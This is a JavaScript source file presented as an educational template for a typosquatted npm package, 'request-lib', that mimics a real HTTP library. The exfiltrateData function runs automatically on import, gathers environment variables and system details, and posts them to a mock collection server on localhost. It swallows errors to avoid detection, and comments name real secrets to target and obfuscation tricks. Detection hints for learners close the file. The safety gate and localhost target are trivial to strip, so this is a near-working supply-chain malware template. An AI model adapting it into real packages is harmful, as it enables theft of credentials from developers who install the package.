/**
 * EDUCATIONAL EXAMPLE: Typosquatted Package Template
 * 
 * This is a template for creating a typosquatted malicious package
 * for educational purposes only.
 * 
 * Package name: request-lib (missing 's' from 'requests-lib')
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as malicious
 * 
 * LEARNING OBJECTIVES:
 * - Understand how malicious packages work
 * - Learn detection techniques
 * - Practice defense strategies
 */

const http = require('http');
const https = require('https');
const { URL } = require('url');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Exfiltrate sensitive data to attacker's server
 * SAFETY: Only works in testbench mode and sends to localhost
 */
function exfiltrateData() {
  // SAFETY CHECK: Only run in testbench environment
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    console.log('[SAFE MODE] Malicious behavior prevented - not in testbench');
    return;
  }

  console.log('[TESTBENCH] Simulating data exfiltration...');

  // Collect "sensitive" data (in real attacks, this could be credentials, API keys, etc.)
  const dataToExfiltrate = {
    timestamp: new Date().toISOString(),
    environment: {
      // In a real attack, this would capture all environment variables
      // We're limiting this for safety
      NODE_ENV: process.env.NODE_ENV,
      PWD: process.env.PWD,
      USER: process.env.USER,
      // Real attacks might look for: AWS_SECRET_KEY, DATABASE_PASSWORD, etc.
    },
    system: {
      platform: process.platform,
      nodeVersion: process.version,
      cwd: process.cwd()
    },
    package: {
      name: 'request-lib',
      installedAt: new Date().toISOString()
    }
  };

  // SAFETY: Only send to localhost (mock attacker server)
  const payload = JSON.stringify(dataToExfiltrate);
  const options = {
    hostname: 'localhost',  // NEVER use external IPs in real learning environments
    port: 3000,             // Mock server port
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = http.request(options, (res) => {
    console.log('[TESTBENCH] Data exfiltration simulated (sent to mock server)');
  });

  req.on('error', (e) => {
    // Silently fail to avoid raising suspicion (typical malware behavior)
    // In testbench, we log it for learning purposes
    console.log('[TESTBENCH] Mock server not available:', e.message);
  });

  req.write(payload);
  req.end();
}

// Execute malicious payload on module load (common technique)
// This runs automatically when the package is imported
try {
  exfiltrateData();
} catch (e) {
  // Silently catch errors to avoid detection
}

// ============================================================================
// LEGITIMATE CODE SECTION - Mimics the real package
// ============================================================================
// This is crucial: The package must work as expected to avoid suspicion

class RequestsLib {
  /**
   * Make a GET request (legitimate functionality)
   */
  static async get(url, options = {}) {
    return this._makeRequest('GET', url, null, options);
  }

  /**
   * Make a POST request (legitimate functionality)
   */
  static async post(url, data, options = {}) {
    return this._makeRequest('POST', url, data, options);
  }

  /**
   * Internal method to make HTTP requests (legitimate functionality)
   */
  static _makeRequest(method, urlString, data, options) {
    return new Promise((resolve, reject) => {
      const parsedUrl = new URL(urlString);
      const protocol = parsedUrl.protocol === 'https:' ? https : http;
      
      const requestOptions = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port,
        path: parsedUrl.pathname + parsedUrl.search,
        method: method,
        headers: options.headers || {}
      };

      if (data) {
        const payload = JSON.stringify(data);
        requestOptions.headers['Content-Type'] = 'application/json';
        requestOptions.headers['Content-Length'] = Buffer.byteLength(payload);
      }

      const req = protocol.request(requestOptions, (res) => {
        let body = '';
        
        res.on('data', (chunk) => {
          body += chunk;
        });
        
        res.on('end', () => {
          try {
            const response = {
              statusCode: res.statusCode,
              headers: res.headers,
              body: body,
              json: () => JSON.parse(body)
            };
            resolve(response);
          } catch (e) {
            resolve({ statusCode: res.statusCode, body: body });
          }
        });
      });

      req.on('error', (e) => {
        reject(e);
      });

      if (data) {
        req.write(JSON.stringify(data));
      }

      req.end();
    });
  }
}

module.exports = RequestsLib;

// ============================================================================
// DETECTION HINTS FOR LEARNERS:
// ============================================================================
// Red flags to look for when reviewing this code:
// 1. Unexpected network requests on module load
// 2. Access to process.env (environment variables)
// 3. Data collection and transmission
// 4. Silent error handling (try-catch without logging)
// 5. Code execution on import (before any function is called)
// 6. Suspicious function names like "exfiltrateData"
// 
// In real attacks, these would be heavily obfuscated:
// - Variable names would be meaningless (a, b, c, etc.)
// - Code would be minified or encoded (base64, hex)
// - Network requests would be hidden in async operations
// - Timing attacks (delay execution to avoid immediate detection)
// ============================================================================

